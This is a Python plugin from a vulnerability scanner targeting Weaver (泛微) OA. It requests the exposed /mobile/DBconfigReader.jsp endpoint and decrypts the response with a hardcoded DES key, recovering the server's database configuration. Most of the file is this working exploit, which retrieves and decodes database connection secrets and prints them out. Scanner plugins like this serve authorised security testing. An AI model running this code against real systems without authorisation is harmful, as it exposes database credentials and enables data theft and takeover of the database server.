#!/usr/bin/env python
# -*- coding: utf-8 -*-

__author__ = 'Ascotbe'
__date__ = '2019/10/13 22:12 PM'
import urllib.parse
import requests
import logging
import ClassCongregation
import pyDes
requests.packages.urllib3.disable_warnings()
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="0" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date'] = "2019-10-26"  # 插件编辑时间
        self.info['algroup'] = "Weaver_DatabaseConfigurationInformationLeaked"  # 插件名称
        self.info['name'] ='泛微OA_数据库配置信息泄露' #漏洞名称
        self.info['affects'] = "泛微OA"  # 漏洞组件
        self.info['desc_content'] = "攻击者可通过存在漏洞的页面直接获取到数据库配置信息。如果攻击者可直接访问数据库，则可直接获取用户数据，甚至可以直接控制数据库服务器。"  # 漏洞描述
        self.info['rank'] = "中危"  # 漏洞等级
        self.info['suggest'] = "尽快升级最新系统"  # 修复建议
        self.info['details'] = Medusa  # 结果

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

def medusa(Url,RandomAgent,ProxyIp=None):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    global resp2
    try:
        payload = "/mobile/DBconfigReader.jsp"
        payload_url = scheme + "://" + url +":"+ str(port) + payload

        key = '1z2x3c4v5b6n'[0:8]
        headers = {
            'User-Agent': RandomAgent,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        }

        s = requests.session()
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = s.get(payload_url,headers=headers, timeout=6, proxies=proxies,verify=False)
        elif ProxyIp==None:
            resp = s.get(payload_url,headers=headers, timeout=6, verify=False)
        con=resp.text
        dec=resp.content[10:]
        resph= resp.headers['Set-Cookie']
        code = resp.status_code
        if code == 200 and resp.headers['Content-Type']=='text/html; charset=UTF-8' and resph.find('ecology') != -1 :
            k = pyDes.des(key, pyDes.ECB, '\0' * 8, pad=None, padmode=pyDes.PAD_PKCS5)
            decs=k.decrypt(dec)
            Medusa = "{} 存在泛微OA_数据库配置信息泄露验证数据:\r\nUrl:{}\r\n返回数据:{}\r\n解密数据:{}".format(url,payload_url,con,decs)
            print(Medusa)
            _t=VulnerabilityInfo(Medusa)
            web=ClassCongregation.VulnerabilityDetails(_t.info)
            web.Intermediate() # serious表示严重，High表示高危，Intermediate表示中危，Low表示低危
            return (str(_t.info))
    except:
        _ = VulnerabilityInfo('').info.get('algroup')
        _l = ClassCongregation.ErrorLog().Write(url, _)  # 调用写入类


